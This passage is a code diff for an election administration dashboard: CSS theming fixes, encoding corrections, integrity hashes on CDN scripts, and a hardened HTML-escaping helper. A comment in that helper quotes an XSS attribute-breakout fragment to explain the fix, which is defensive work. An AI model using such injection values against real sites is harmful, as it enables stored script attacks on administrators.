@@ -1,4 +1,4 @@
-﻿<?php
+<?php
 require_once __DIR__ . '/../includes/functions.php';
 require_once __DIR__ . '/../config/db.php';
 
@@ -12,6 +12,8 @@ $csrfToken = csrfToken();
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="Aklan Catholic College student council election administration panel.">
+<link rel="icon" href="../assets/favicon.png" type="image/png">
 <title>Admin Dashboard | School Elections</title>
 <style>
 :root{
@@ -41,9 +43,25 @@ $csrfToken = csrfToken();
     --purple:#8b5cf6;
     --amber:#f59e0b;
     --teal:#14b8a6;
+    --danger:#dc2626;
+    /* The admin panel inlines its own stylesheet and does NOT load
+       assets/dashboard-app.css (that's the student dashboard). Results
+       markup uses the student token names, which resolve to nothing here and
+       silently fall back to the browser's initial values — invisible text on
+       a dark card. These aliases map the shared names onto the admin panel's
+       own tokens so both themes render correctly. */
+    --text:var(--ink);
+    --text-secondary:var(--muted);
+    --border:var(--line);
+    --border-strong:var(--line-strong);
+    --card:var(--surface);
+    --card-2:var(--surface-2);
+    --accent:var(--lime);
+    --accent-dark:var(--lime-dark);
+    --warning:var(--amber);
 }
 /* ================= DARK THEME ================= */
-/* Toggled via [data-theme="dark"] on <html> â€” see the theme switcher in
+/* Toggled via [data-theme="dark"] on <html> — see the theme switcher in
    the sidebar. Sidebar itself stays the same dark navy in both modes
    (it's already dark), so only the main content surface tokens change. */
 [data-theme="dark"]{
@@ -61,7 +79,92 @@ $csrfToken = csrfToken();
     --card-shadow:0 1px 2px rgba(0,0,0,.3), 0 10px 24px -14px rgba(0,0,0,.55);
     --card-shadow-hover:0 4px 12px rgba(0,0,0,.4), 0 18px 34px -16px rgba(0,0,0,.65);
     --lime-soft:rgba(132,204,22,.12);
+    --danger:#f87171;
 }
+
+/* ================= RESULTS PANEL (Overview / Detail / Reports) =====
+   These rules live here, not in assets/dashboard-app.css, because the admin
+   panel inlines its own stylesheet and never loads that file (it belongs to
+   the student dashboard). They were previously defined only in the student
+   stylesheet, so every one of them resolved to nothing inside the admin panel
+   — which is why the stat tiles rendered as unstyled stacked text and the
+   report headings were invisible on the dark card.
+
+   All colours go through the admin panel's own tokens (--surface, --ink,
+   --muted, --line, --lime, --amber...), so both themes are handled by
+   swapping the token values above rather than by duplicate dark-mode rules. */
+.stat-strip{display:grid;grid-template-columns:repeat(auto-fit,minmax(210px,1fr));gap:1rem;margin-bottom:1.5rem;}
+.stat-tile{
+    background:var(--surface);border:1px solid var(--line);border-left:4px solid var(--line-strong);
+    border-radius:10px;padding:.95rem 1.1rem 1rem;box-shadow:var(--card-shadow);
+    display:flex;flex-direction:column;min-width:0;
+}
+/* The rail colour encodes meaning: lime = healthy, amber = needs attention,
+   slate = nothing to act on yet. */
+.stat-tile.tone-good{border-left-color:var(--lime-dark);}
+.stat-tile.tone-warn{border-left-color:var(--amber);}
+.stat-tile.tone-neutral{border-left-color:var(--line-strong);}
+.stat-tile .k{font-size:.7rem;font-weight:700;text-transform:uppercase;letter-spacing:.06em;color:var(--muted);}
+.stat-tile .v{font-size:1.9rem;font-weight:800;color:var(--ink);line-height:1.1;letter-spacing:-.02em;margin:.15rem 0 .2rem;}
+.stat-tile .s{font-size:.78rem;color:var(--muted);line-height:1.45;}
+.stat-tile .hint{font-size:.72rem;color:var(--muted);margin-top:.5rem;padding-top:.5rem;border-top:1px dashed var(--line);line-height:1.45;}
+
+/* Per-election summary — the "outside" view. */
+.ov-table{width:100%;border-collapse:collapse;}
+.ov-table th{text-align:left;font-size:.68rem;font-weight:700;text-transform:uppercase;letter-spacing:.06em;color:var(--muted);padding:0 .75rem .55rem;border-bottom:1px solid var(--line);white-space:nowrap;}
+.ov-table td{padding:.7rem .75rem;border-bottom:1px solid var(--line);font-size:.86rem;color:var(--ink);vertical-align:middle;}
+.ov-table tr:last-child td{border-bottom:none;}
+.ov-table .num{text-align:right;font-variant-numeric:tabular-nums;white-space:nowrap;}
+.ov-table .ov-name{font-weight:600;}
+.ov-table .ov-sub{display:block;font-size:.74rem;color:var(--muted);margin-top:.15rem;}
+
+/* Turnout meter — a fixed-width track so elections are comparable at a glance. */
+.meter{display:flex;align-items:center;gap:.55rem;min-width:140px;}
+.meter-track{flex:1;height:7px;min-width:64px;background:var(--surface-2);border-radius:999px;overflow:hidden;border:1px solid var(--line);}
+.meter-fill{height:100%;background:var(--lime-dark);border-radius:999px;}
+.meter-fill.low{background:var(--amber);}
+.meter-fill.none{background:var(--line-strong);}
+.meter-label{font-size:.8rem;font-weight:700;color:var(--ink);font-variant-numeric:tabular-nums;min-width:46px;text-align:right;}
+
+/* "Needs your attention" */
+.ov-flags{display:flex;flex-direction:column;gap:.55rem;}
+.ov-flag{display:flex;align-items:flex-start;gap:.6rem;padding:.65rem .85rem;border-radius:8px;background:var(--surface-2);border:1px solid var(--line);border-left-width:3px;font-size:.85rem;line-height:1.5;color:var(--ink);}
+.ov-flag .flag-icon{flex-shrink:0;line-height:1.4;}
+.ov-flag.warn{border-left-color:var(--amber);}
+.ov-flag.info{border-left-color:var(--line-strong);}
+.ov-flag.good{border-left-color:var(--lime-dark);}
+
+/* Chart containers */
+.chart-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(340px,1fr));gap:1.25rem;}
+.chart-grid .span-full{grid-column:1 / -1;}
+.chart-card{background:var(--surface);border:1px solid var(--border);border-radius:12px;padding:1.1rem 1.25rem 1.25rem;box-shadow:var(--card-shadow);display:flex;flex-direction:column;min-width:0;}
+.chart-card-head{display:flex;align-items:baseline;justify-content:space-between;gap:.75rem;margin-bottom:.2rem;flex-wrap:wrap;}
+.chart-card-title{font-size:.95rem;font-weight:800;color:var(--ink);margin:0;}
+.chart-card-sub{font-size:.76rem;color:var(--muted);margin:0 0 .9rem;line-height:1.5;}
+.chart-box{position:relative;height:260px;min-width:0;}
+.chart-box.tall{height:340px;}
+.chart-empty{display:flex;align-items:center;justify-content:center;height:100%;min-height:120px;text-align:center;color:var(--muted);font-size:.85rem;padding:1rem;}
+/* Lives OUTSIDE .chart-box on purpose: the box has a fixed height, so
+   anything inserted after the canvas would overflow the card. */
+.chart-legend-note{font-size:.72rem;color:var(--muted);margin:.75rem 0 0;line-height:1.5;}
+.chip-legend{display:flex;flex-wrap:wrap;gap:.4rem;margin-top:.8rem;}
+.chip-legend .chip{display:inline-flex;align-items:center;gap:.35rem;font-size:.74rem;color:var(--muted);background:var(--surface-2);border:1px solid var(--line);padding:.22rem .55rem;border-radius:999px;}
+.chip-legend .swatch{width:10px;height:10px;border-radius:3px;flex-shrink:0;}
+
+/* Report preview rows — the heading previously used var(--navy) via inline
+   styles; it now comes from the token set above. */
+/* Reports preview. The section heading previously carried an inline
+   color:var(--navy). --navy is #101828 — near-black — so on the dark card in
+   dark mode the election name (e.g. "Engineering — Department Student
+   Government") was invisible. Colour now comes from a token that is
+   redefined per theme, stated explicitly rather than left to inheritance. */
+.report-preview h4{margin:0 0 .5rem;font-size:.95rem;color:var(--ink);border-bottom:1px solid var(--line);padding-bottom:.45rem;}
+.report-row{display:flex;justify-content:space-between;gap:1rem;padding:.6rem 0;border-bottom:1px solid var(--border);}
+.report-row:last-child{border-bottom:none;}
+.report-row .pos{font-weight:600;color:var(--ink);}
+.report-row .who{text-align:right;color:var(--ink);}
+.report-row .who-none{color:var(--muted);font-style:italic;}
+
 *{box-sizing:border-box;}
 body{margin:0;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',system-ui,Roboto,sans-serif;background:var(--bg);color:var(--ink);-webkit-font-smoothing:antialiased;}
 
@@ -203,12 +306,12 @@ body{margin:0;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',system-ui,
 .results-mini .rm-title{font-weight:600;font-size:.92rem;}
 .results-block .rm-head .btn{flex-shrink:0;}
 
-/* ================= ELECTION PANEL â€” CARDS ================= */
+/* ================= ELECTION PANEL — CARDS ================= */
 .election-cards{display:flex;flex-direction:column;gap:1.25rem;}
 .election-card{background:var(--surface);border-radius:var(--radius-lg);border:1px solid var(--line);box-shadow:var(--card-shadow);padding:1.6rem 1.75rem;border-top:3px solid var(--lime);display:flex;flex-direction:column;gap:1rem;transition:box-shadow .2s;}
 .election-card:hover{box-shadow:var(--card-shadow-hover);}
 /* Left-edge accent color echoes the status badge, so a card reads its
-   status at a glance even before you get to the badge text â€” and ties
+   status at a glance even before you get to the badge text — and ties
    visually back to its group header below. */
 .election-card.status-ongoing{border-top-color:#22c55e;}
 .election-card.status-paused{border-top-color:#f59e0b;}
@@ -216,7 +319,7 @@ body{margin:0;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',system-ui,
 .election-card.status-draft{border-top-color:#94a3b8;}
 .election-card.status-closed{border-top-color:#ef4444;}
 
-/* Status group headers â€” elections are grouped (Ongoing / Paused /
+/* Status group headers — elections are grouped (Ongoing / Paused /
    Upcoming / Drafts / Ended) instead of listed in raw, unordered API
    order, so a mixed list doesn't read as random clutter. */
 .election-group-header{display:flex;align-items:center;gap:.55rem;margin:1.9rem 0 .85rem;}
@@ -383,7 +486,7 @@ table.students-table tr:hover td{background:var(--surface-hover);}
 .pw-toggle-btn.is-visible .pw-icon-on{display:block;}
 .pw-hint{font-size:.75rem;color:var(--muted);margin-top:.3rem;}
 
-/* Visible focus rings â€” helps anyone navigating by keyboard or with
+/* Visible focus rings — helps anyone navigating by keyboard or with
    assistive tech on mobile, without adding an outline to every mouse click. */
 .btn:focus-visible,.pill-toggle button:focus-visible,.sidebar nav a:focus-visible,
 .row-actions button:focus-visible,.type-choice:focus-visible{
@@ -401,7 +504,7 @@ input[type="password"]::-webkit-strong-password-auto-fill-button {
 
 /* Chrome/Edge forcibly paint autofilled and "saved info" fields (like the
    Student ID field's saved-values dropdown) with their own white
-   background and black text â€” normal background/color rules can't
+   background and black text — normal background/color rules can't
    override this. The only reliable fix is this inset box-shadow trick,
    which paints over it with our own themed color, plus a very long
    transition delay to suppress the yellow flash Chrome briefly shows
@@ -419,7 +522,7 @@ input:-webkit-autofill:active {
 
 /* ================= RESPONSIVE ================= */
 /* Prevent any stray wide element from causing horizontal scroll of the
-   whole page on phones â€” individual tables/wizards handle their own
+   whole page on phones — individual tables/wizards handle their own
    scrolling instead (see .students-table-wrap / .table-scroll below). */
 html,body{overflow-x:hidden;}
 
@@ -632,7 +735,7 @@ html,body{overflow-x:hidden;}
 /* Structural surfaces (cards, inputs, borders) already inherit dark
    values automatically because they reference the --surface/--ink/--muted/
    --line tokens redefined above. The pastel status/alert/badge colors
-   below don't use those tokens â€” they hardcode a light tint + a dark
+   below don't use those tokens — they hardcode a light tint + a dark
    saturated text color for contrast on a WHITE card, so each needs an
    explicit dark-mode pairing (higher-opacity tint + a lighter text tone)
    to stay readable on a dark card instead of just going muddy. */
@@ -689,7 +792,7 @@ body,.sidebar,.card,.stat-box,.election-card,.wizard-section,.students-table-wra
 // initial theme just appears correctly rather than visibly animating in.
 (function(){
     // Default is always light unless the admin has explicitly flipped the
-    // switch before (saved in localStorage) â€” deliberately ignoring the
+    // switch before (saved in localStorage) — deliberately ignoring the
     // OS/browser's prefers-color-scheme, so the panel doesn't silently
     // open in dark mode just because the admin's system happens to be
     // in dark mode. The switch is "on" for dark, "off" (default) for light.
@@ -698,13 +801,13 @@ body,.sidebar,.card,.stat-box,.election-card,.wizard-section,.students-table-wra
     document.documentElement.setAttribute('data-theme', theme);
 })();
 </script>
-<script src="https://cdnjs.cloudflare.com/ajax/libs/xlsx/0.18.5/xlsx.full.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/xlsx/0.18.5/xlsx.full.min.js" integrity="sha384-vtjasyidUo0kW94K5MXDXntzOJpQgBKXmE7e2Ga4LG0skTTLeBi97eFAXsqewJjw" crossorigin="anonymous"></script>
 <!-- Chart.js drives the Results > Overview charts. Loaded from CDN for the
      same reason SheetJS is: no build step in this project. Every chart is
      guarded by a `chartLibReady()` check, so if the CDN is unreachable the
      Overview falls back to a plain message and the rest of the panel (and
      the whole admin dashboard) keeps working. -->
-<script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/4.4.1/chart.umd.min.js"></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/4.4.1/chart.umd.min.js" integrity="sha384-bs/nf9FbdNouRbMiFcrcZfLXYPKiPaGVGplVbv7dLGECccEXDW+S3zjqSKR5ZEaD" crossorigin="anonymous"></script>
 </head>
 <body>
 
@@ -746,7 +849,7 @@ body,.sidebar,.card,.stat-box,.election-card,.wizard-section,.students-table-wra
     <div class="main-content">
         <div class="page-header">
             <div style="display:flex;align-items:center;gap:.75rem;">
-                <button class="hamburger" id="hamburgerBtn" aria-label="Toggle sidebar">â˜°</button>
+                <button class="hamburger" id="hamburgerBtn" aria-label="Toggle sidebar">☰</button>
                 <h1 id="pageHeaderTitle">Dashboard</h1>
             </div>
             <span class="date" id="pageHeaderDate"></span>
@@ -806,7 +909,7 @@ function showToast(message, type = 'info', { duration = 4500, actionLabel = null
     el.innerHTML = `
         <span class="toast-icon">${TOAST_ICONS[type] || TOAST_ICONS.info}</span>
         <span class="toast-msg">${escapeHtml(message)}${actionLabel ? `<br><button type="button" class="toast-action">${escapeHtml(actionLabel)}</button>` : ''}</span>
-        <button type="button" class="toast-close" aria-label="Dismiss">âœ•</button>
+        <button type="button" class="toast-close" aria-label="Dismiss">✕</button>
     `;
     const remove = () => {
         el.classList.add('leaving');
@@ -891,7 +994,7 @@ async function showPanel(name, focusId){
     return true;
 }
 
-// Dashboard "Quick Actions" â€” jump straight past the panel and into the
+// Dashboard "Quick Actions" — jump straight past the panel and into the
 // create/register flow, instead of switching panels and then still
 // having to find and click the "+" button there. Bails out cleanly if
 // showPanel() itself was cancelled (e.g. the admin had unsaved wizard
@@ -928,7 +1031,7 @@ window.addEventListener('resize', () => { if (window.innerWidth > 768) toggleSid
 // and change that state, and persists the choice for next visit.
 //
 // Label + icon describe whichever mode is CURRENTLY ACTIVE ("Light Mode"
-// while in light mode, "Dark Mode" while in dark mode) â€” not the action
+// while in light mode, "Dark Mode" while in dark mode) — not the action
 // clicking it would perform. The switch position (gray+left = off/light,
 // green+right = on/dark) tracks the same state in parallel.
 // ------------------------------------------------------------------
@@ -965,16 +1068,18 @@ document.getElementById('pageHeaderDate').textContent = new Date().toLocaleDateS
 // ------------------------------------------------------------------
 // HELPERS
 // ------------------------------------------------------------------
+// Quote-safe: textContent->innerHTML escapes only & < >, so a
+// value like  Bob" onmouseover="...  breaks out of a double-quoted
+// HTML attribute (stored XSS — student names are attacker-
+// controlled at self-registration). Escape quotes too.
 function escapeHtml(str){
-    const d = document.createElement('div');
-    d.textContent = str ?? '';
-    return d.innerHTML;
+    return String(str ?? '').replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]));
 }
 // Server-generated timestamps (activity_logs.created_at, via Postgres's
 // CURRENT_TIMESTAMP) are stored in UTC, unlike election start/end dates
 // which are literal wall-clock values the admin typed in and are never
 // converted. Without the explicit "Z", `new Date("2026-08-12 05:05:23")`
-// gets parsed as if 05:05 were already the browser's local time â€” so a
+// gets parsed as if 05:05 were already the browser's local time — so a
 // log written at 05:05 UTC (1:05 PM in a UTC+8 timezone like the
 // Philippines) would incorrectly display as "5:05 AM" instead of
 // converting to the viewer's actual local time. Appending "Z" tells the
@@ -984,7 +1089,7 @@ function parseServerTimestamp(str){
     return new Date(str.replace(' ', 'T') + 'Z');
 }
 function fmtDateTime(iso){
-    if (!iso) return 'â€”';
+    if (!iso) return '—';
     const d = new Date(iso);
     return d.toLocaleString('en-US', {month:'short', day:'numeric', year:'numeric', hour:'numeric', minute:'2-digit'});
 }
@@ -994,16 +1099,16 @@ function statusLabel(s){
 function statusClass(s){
     return {draft:'draft', scheduled:'scheduled', ongoing:'', paused:'paused', closed:'closed', archived:'closed'}[s] || '';
 }
-// Consistent "For SY 2027-2028" badge â€” used on election cards, results,
+// Consistent "For SY 2027-2028" badge — used on election cards, results,
 // and archive everywhere an election's target school year should be
 // visible. Every election has one (auto-defaulted at creation), so this
 // only renders nothing for pre-migration legacy rows with none set.
 function syBadgeHtml(label){
     if (!label) return '';
-    return `<span class="sy-badge" title="Which school year these officers serve">ðŸŽ“ SY ${escapeHtml(label)}</span>`;
+    return `<span class="sy-badge" title="Which school year these officers serve">🎓 SY ${escapeHtml(label)}</span>`;
 }
 // Fire-and-forget: post an activity line to the real activity_logs table.
-// Never awaited by callers and never throws â€” a logging hiccup should
+// Never awaited by callers and never throws — a logging hiccup should
 // never block or fail the actual action that triggered it.
 function addLog(text){
     fetch(LOGS_API, {
@@ -1017,7 +1122,7 @@ function logTimeLabel(createdAt){
     return d.toLocaleString('en-US', {month:'short', day:'numeric', year:'numeric', hour:'numeric', minute:'2-digit'});
 }
 function logLine(l){
-    return `<div class="log-item"><span class="log-time">${escapeHtml(logTimeLabel(l.created_at))}</span><span class="log-text">${l.admin_username ? `<strong>${escapeHtml(l.admin_username)}</strong> â€” ` : ''}${escapeHtml(l.action)}</span></div>`;
+    return `<div class="log-item"><span class="log-time">${escapeHtml(logTimeLabel(l.created_at))}</span><span class="log-text">${l.admin_username ? `<strong>${escapeHtml(l.admin_username)}</strong> — ` : ''}${escapeHtml(l.action)}</span></div>`;
 }
 // Tiny inline trend line for the dashboard's turnout-history sparkline.
 function sparklineSVG(points, w = 130, h = 32){
@@ -1055,7 +1160,7 @@ async function renderDashboard(){
 
         // "Voted" here means the student has completed EVERY election
         // they're currently eligible for (SSG, plus their department's
-        // DSG if one exists) â€” computed from real per-election vote data,
+        // DSG if one exists) — computed from real per-election vote data,
         // same as the Students table. This used to just check the legacy
         // has_voted flag ("voted in at least one election, ever"), which
         // overcounted turnout as soon as more than one election was open
@@ -1104,12 +1209,12 @@ async function renderDashboard(){
             <text x="75" y="90" text-anchor="middle" font-size="11" style="fill:var(--muted);">turnout</text>
         </svg>`;
 
-        // Turnout trend â€” best-effort only. This is NOT server-side history;
+        // Turnout trend — best-effort only. This is NOT server-side history;
         // it's a small log of turnout snapshots kept in THIS browser's
         // localStorage, recorded at most once every 5 minutes the dashboard
         // is viewed. It resets if the admin switches browsers/devices or
         // clears site data. A real cross-device trend would need a
-        // server-side snapshots table â€” flagging that rather than pretending
+        // server-side snapshots table — flagging that rather than pretending
         // this is more durable than it is.
         let turnoutHistory = [];
         try { turnoutHistory = JSON.parse(localStorage.getItem('turnoutHistory') || '[]'); } catch(e) { turnoutHistory = []; }
@@ -1122,7 +1227,7 @@ async function renderDashboard(){
         const sparkline = totalStudents > 0 ? sparklineSVG(turnoutHistory.map(h => h.pct)) : '';
         // Compares against the PREVIOUS snapshot (index length-2, i.e. the
         // one right before this one), not the oldest one in the rolling
-        // 20-entry window â€” "since your last check" should mean since the
+        // 20-entry window — "since your last check" should mean since the
         // last time you looked, not since whenever this window happened
         // to start (which could've been over an hour of checks ago).
         const trendDelta = turnoutHistory.length > 1 ? pct - turnoutHistory[turnoutHistory.length - 2].pct : null;
@@ -1141,7 +1246,7 @@ async function renderDashboard(){
         const gettingStarted = (totalStudents === 0 && totalElections === 0) ? `
             <div class="getting-started">
                 <h2>Welcome to your election dashboard</h2>
-                <p>Nothing's set up yet â€” here's how most admins get started.</p>
+                <p>Nothing's set up yet — here's how most admins get started.</p>
                 <div class="gs-steps">
                     <div class="gs-step">
                         <div class="gs-num">1</div>
@@ -1159,7 +1264,7 @@ async function renderDashboard(){
             </div>` : '';
 
         // Once there's actual data, the step-by-step Getting Started card
-        // above stops showing â€” these two replace it as the fast path
+        // above stops showing — these two replace it as the fast path
         // for the most common "I want to start something new" actions,
         // right where an admin lands after logging in.
         const quickActions = !gettingStarted ? `
@@ -1199,11 +1304,11 @@ async function renderDashboard(){
                     <div class="donut-wrap">
                         ${donut}
                         <div class="donut-legend">
-                            <div class="lg-item"><span class="dot" style="background:#84cc16;"></span> Voted â€” ${voted}</div>
-                            <div class="lg-item"><span class="dot" style="background:var(--line-strong);"></span> Not voted â€” ${notVoted}</div>
+                            <div class="lg-item"><span class="dot" style="background:#84cc16;"></span> Voted — ${voted}</div>
+                            <div class="lg-item"><span class="dot" style="background:var(--line-strong);"></span> Not voted — ${notVoted}</div>
                         </div>
                     </div>
-                    ${sparkline ? `<div style="text-align:center;">${sparkline}<div class="trend-note">${trendDelta === null ? 'Tracking turnout across your checks on this device' : (trendDelta === 0 ? 'No change since your last check' : `<strong>${trendDelta > 0 ? 'â–²' : 'â–¼'} ${Math.abs(trendDelta)} pt${Math.abs(trendDelta)===1?'':'s'}</strong> since your last check`)} <em>(this device only)</em></div></div>` : ''}
+                    ${sparkline ? `<div style="text-align:center;">${sparkline}<div class="trend-note">${trendDelta === null ? 'Tracking turnout across your checks on this device' : (trendDelta === 0 ? 'No change since your last check' : `<strong>${trendDelta > 0 ? '▲' : '▼'} ${Math.abs(trendDelta)} pt${Math.abs(trendDelta)===1?'':'s'}</strong> since your last check`)} <em>(this device only)</em></div></div>` : ''}
                     <h3 style="font-size:.95rem;margin:1.5rem 0 .5rem;">Insights</h3>
                     <ul class="insight-list">
                         <li>${totalStudents} students registered, ${pct}% have voted.</li>
@@ -1254,14 +1359,14 @@ function wizardIsDirty(){
 let wizardStep = 1;
 let wizardInvalidFields = new Set(); // field keys currently showing an inline validation error (see goToCandidates)
 // Faculty (departments table) / School Year / Year Level are all
-// admin-editable via the Settings panel (api/settings.php) â€” populated
+// admin-editable via the Settings panel (api/settings.php) — populated
 // from the server instead of a fixed list. Year level is no longer
 // picked directly anywhere in this UI: it's computed from a student's
 // School Year vs. the active one (see computeYearLevelClient() below,
 // mirroring computeYearLevel() in includes/functions.php).
 // loadSettingsData() fills these in during init(), before any panel that
 // depends on them renders.
-let departmentOptions = []; // Faculty codes â€” variable name kept as-is to avoid touching every call site
+let departmentOptions = []; // Faculty codes — variable name kept as-is to avoid touching every call site
 let yearOptions = [];
 let schoolYearOptions = []; // [{id, label, start_year, is_active, sort_order}, ...]
 let activeSchoolYear = null; // the one row from schoolYearOptions with is_active true, or null
@@ -1275,8 +1380,8 @@ let settingsData = { departments: [], year_levels: [], school_years: [] };
 let ssgLogo = null;          // base64 data URL, or null if not uploaded yet
 let departmentLogos = {};    // { department_code: base64 data URL or null }
 
-// Generic "institution" glyph â€” same one includes/functions.php renders
-// server-side (defaultElectionLogoSvg()) â€” shown whenever SSG or a
+// Generic "institution" glyph — same one includes/functions.php renders
+// server-side (defaultElectionLogoSvg()) — shown whenever SSG or a
 // department doesn't have a logo uploaded yet, instead of a broken image
 // or an emoji.
 const ELOGO_PLACEHOLDER_SVG = '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="elogo-placeholder"><path d="M3 21h18"/><path d="M5 21V9.5L12 4l7 5.5V21"/><path d="M9 21v-6h6v6"/></svg>';
@@ -1305,7 +1410,7 @@ async function loadSettingsData(force = false){
 }
 
 // Client-side mirror of currentSchoolYearStartYear() in
-// includes/functions.php â€” school years run June-May, so before June
+// includes/functions.php — school years run June-May, so before June
 // we're still in the year that started last calendar year.
 function currentSchoolYearStartYearClient(){
     const now = new Date();
@@ -1317,7 +1422,7 @@ function nextSchoolYearStartYearClient(){
     return currentSchoolYearStartYearClient() + 1;
 }
 
-// Client-side mirror of computeYearLevel() in includes/functions.php â€”
+// Client-side mirror of computeYearLevel() in includes/functions.php —
 // used so the Students panel can show a student's year level live as the
 // admin picks a School Year, without a round trip. Source of truth is
 // still whatever the server actually stored (and login.php refreshes it
@@ -1372,15 +1477,15 @@ function renderElectionCard(e){
     } else if (isClosed) {
         remainingHtml = `<div class="remaining-time">This election has ended.</div>`;
     } else if (isPaused) {
-        remainingHtml = `<div class="remaining-time">Paused â€” voting is on hold.</div>`;
+        remainingHtml = `<div class="remaining-time">Paused — voting is on hold.</div>`;
     } else if (isDraft) {
-        remainingHtml = `<div class="remaining-time">Hidden from students â€” save a schedule to activate</div>`;
+        remainingHtml = `<div class="remaining-time">Hidden from students — save a schedule to activate</div>`;
     } else {
         remainingHtml = `<div class="remaining-time">Starts automatically on ${fmtDateTime(e.start_date)}</div>`;
     }
 
     // Primary (lifecycle) actions on the left, Edit/Delete/Archive grouped
-    // and pushed to the right via margin-left:auto â€” keeps the destructive/
+    // and pushed to the right via margin-left:auto — keeps the destructive/
     // structural actions visually separate from the day-to-day ones.
     const primaryActions = `
         ${canStartNow ? `<button class="btn btn-primary" onclick="startElection(${e.id})">Start Now</button>` : ''}
@@ -1407,7 +1512,7 @@ function renderElectionCard(e){
             <div class="election-logo-badge">${electionLogoHtml(e.type, e.department)}</div>
             <div>
                 <h2 class="election-title">${escapeHtml(e.name)}</h2>
-                <div class="election-sub">${e.type === 'SSG' ? 'Supreme Student Government' : 'Department Student Government â€” ' + escapeHtml(e.department || '')}</div>
+                <div class="election-sub">${e.type === 'SSG' ? 'Supreme Student Government' : 'Department Student Government — ' + escapeHtml(e.department || '')}</div>
             </div>
         </div>
         <div class="schedule-box">
@@ -1449,7 +1554,7 @@ function renderElectionList(){
             </div>
         `;
     } else {
-        // Election School Year filter â€” narrows to one target school year
+        // Election School Year filter — narrows to one target school year
         // before the status grouping below, since elections are usually
         // created a year ahead and it's easy to lose track of which batch
         // is for which year once a few pile up.
@@ -1477,7 +1582,7 @@ function renderElectionList(){
             ? visibleElections
             : visibleElections.filter(e => String(e.target_school_year_id) === String(electionSchoolYearFilter));
 
-        // Group elections by status (Ongoing â†’ Paused â†’ Upcoming â†’ Drafts â†’
+        // Group elections by status (Ongoing → Paused → Upcoming → Drafts →
         // Ended) instead of leaving them in raw API order, where a mixed
         // batch of statuses reads as random clutter. A filter bar lets the
         // admin narrow to just one status when the list gets long.
@@ -1530,7 +1635,7 @@ function renderElectionList(){
 
 // ------------------------------------------------------------------
 // ELECTION LIFECYCLE ACTIONS (Start/Pause/End/Delete/Save Schedule/
-// View Results) â€” these send lightweight PATCH-style PUT requests
+// View Results) — these send lightweight PATCH-style PUT requests
 // (no "positions" key in the body) so the API only touches the field
 // that changed instead of requiring the full position/candidate roster.
 // ------------------------------------------------------------------
@@ -1557,7 +1662,7 @@ async function saveSchedule(id){
     const e = currentElections.find(e => e.id === id);
     const ok = await electionPatch(id, {start, end});
     if (!ok) return;
-    addLog(`Updated schedule for "${e ? e.name : 'election'}" (${fmtDateTime(start)} â†’ ${fmtDateTime(end)})`);
+    addLog(`Updated schedule for "${e ? e.name : 'election'}" (${fmtDateTime(start)} → ${fmtDateTime(end)})`);
     showToast('Schedule saved.', 'success');
     await loadElectionList();
 }
@@ -1614,7 +1719,7 @@ async function deleteElection(id){
         const res = await fetch(ELECTIONS_API, {
             method: 'DELETE',
             headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({csrf_token: CSRF_TOKEN, id})
+            body: JSON.stringify({csrf_token: CSRF_TOKEN, id, confirm_delete: true})
         });
         const data = await res.json();
         if (!res.ok || data.error) { showToast(data.error || 'Delete failed.', 'error'); return; }
@@ -1648,7 +1753,7 @@ async function unarchiveElection(id){
 }
 
 // ------------------------------------------------------------------
-// "NEXT SCHOOL YEAR ELECTION" â€” the once-a-year bulk rollover: archives
+// "NEXT SCHOOL YEAR ELECTION" — the once-a-year bulk rollover: archives
 // every election, advances the active school year, and recomputes every
 // student's year level (auto-graduating anyone who crosses 4 years with
 // no lifecycle flag set). See api/next-school-year.php.
@@ -1665,7 +1770,7 @@ async function openNextSchoolYearModal(){
                 <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/><line x1="12" y1="9" x2="12" y2="13"/><line x1="12" y1="17" x2="12.01" y2="17"/></svg>
             </div>
             <h3>Archive all current elections?</h3>
-            <p>This clears the Elections list for a fresh cycle by archiving every election that isn't already archived. Current school year: <strong>${escapeHtml(currentLabel)}</strong>. This does <strong>not</strong> change any student's year level â€” students track that themselves (automatically if Normal, or via "Update Year Level" on their dashboard). This cannot be undone.</p>
+            <p>This clears the Elections list for a fresh cycle by archiving every election that isn't already archived. Current school year: <strong>${escapeHtml(currentLabel)}</strong>. This does <strong>not</strong> change any student's year level — students track that themselves (automatically if Normal, or via "Update Year Level" on their dashboard). This cannot be undone.</p>
             <div class="modal-actions">
                 <button type="button" class="btn btn-secondary" data-choice="cancel">Cancel</button>
                 <button type="button" class="btn btn-danger" data-choice="confirm">Archive Elections</button>
@@ -1678,7 +1783,7 @@ async function openNextSchoolYearModal(){
     overlay.querySelector('[data-choice="confirm"]').addEventListener('click', async () => {
         const btn = overlay.querySelector('[data-choice="confirm"]');
         btn.disabled = true;
-        btn.innerHTML = '<span class="btn-spinner dark"></span> Archivingâ€¦';
+        btn.innerHTML = '<span class="btn-spinner dark"></span> Archiving…';
         try {
             const res = await fetch(NEXT_SCHOOL_YEAR_API, {
                 method: 'POST',
@@ -1712,7 +1817,7 @@ function blankDraft(){
     const start = now.toISOString().slice(0,16);
     const end = new Date(now.getTime() + 7*24*60*60*1000).toISOString().slice(0,16);
     // Elections are run FOR the upcoming school year (officers elected now
-    // take office once it starts) â€” default to whichever school_years row
+    // take office once it starts) — default to whichever school_years row
     // has that start_year, if it's already in the list (settings.php's GET
     // auto-ensures it exists); admin can override in the wizard.
     const nextSY = schoolYearOptions.find(sy => sy.start_year === nextSchoolYearStartYearClient());
@@ -1725,7 +1830,7 @@ function blankDraft(){
         targetSchoolYearId: nextSY ? nextSY.id : null,
         partiesEnabled: false, parties: [],
         // Start with one blank position row so it actually matches what the
